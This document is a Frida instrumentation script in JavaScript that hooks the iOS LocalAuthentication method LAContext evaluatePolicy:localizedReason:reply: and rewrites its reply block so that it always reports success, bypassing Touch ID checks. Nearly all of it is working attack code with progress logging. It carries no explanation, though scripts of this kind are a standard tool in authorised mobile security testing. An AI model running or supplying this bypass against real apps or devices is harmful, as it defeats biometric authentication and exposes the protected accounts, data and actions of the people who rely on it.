setTimeout(function() {
    if (ObjC.available) {
        console.log("[*] Objective-C runtime is available.");

        try {
            var hook =
                ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
            console.log(
                "[*] LAContext class method evaluatePolicy:localizedReason:reply: found."
            );

            Interceptor.attach(hook.implementation, {
                onEnter: function(args) {
                    console.log("[*] Intercepting method invocation...");
                    console.log("[+] Policy: " + args[2].toString());
                    console.log(
                        "[+] Localized Reason: " + ObjC.Object(args[3]).toString()
                    );

                    var block = new ObjC.Block(args[4]);
                    console.log("[*] Original reply block obtained.");

                    const callback = block.implementation;
                    console.log("[*] Original block implementation obtained.");

                    block.implementation = function(error, value) {
                        console.log(
                            "[*] Modifying block implementation to bypass Touch ID..."
                        );
                        console.log("[+] Original error value: " + error);
                        console.log("[+] Original success value: " + value);

                        console.log("[*] Touch ID has been bypassed successfully!");
                        return callback(true, null);
                    };

                    console.log("[*] Block implementation modified successfully.");
                },
                onLeave: function(retval) {
                    console.log("[*] Leaving method invocation...");
                    console.log("[+] Return Value: " + retval.toString());
                },
            });
        } catch (error) {
            console.error("[-] Error occurred: " + error.message);
        }
    } else {
        console.error("[-] Objective-C Runtime is not available!");
    }
}, 0);
